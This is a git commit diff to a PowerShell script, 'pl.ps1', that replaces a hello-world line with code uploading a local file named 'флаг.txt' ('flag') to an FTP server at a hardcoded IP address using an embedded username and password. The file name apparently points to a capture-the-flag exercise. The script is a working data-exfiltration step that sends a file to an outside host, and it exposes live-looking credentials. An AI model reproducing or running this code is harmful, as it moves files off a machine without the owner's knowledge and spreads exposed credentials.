d07a9f3bd1f0a73adf208d50dab4d6878dcce6c9
fostralx <50956518+fostralx@users.noreply.github.com>
2019-05-27 17:47:12 +0300

    Update pl.ps1

--- pl.ps1
+++ pl.ps1
@@ -1,1 +1,11 @@
-powershell echo "hello world!"
+$File = "C:\флаг.txt";
+$ftp = "ftp://ih1562471:FmgLXptE2mUW@193.124.176.46";
+
+Write-Host -Object "ftp url: $ftp";
+
+$webclient = New-Object -TypeName System.Net.WebClient;
+$uri = New-Object -TypeName System.Uri -ArgumentList $ftp;
+
+Write-Host -Object "Uploading $File...";
+
+$webclient.UploadFile($uri, $File);
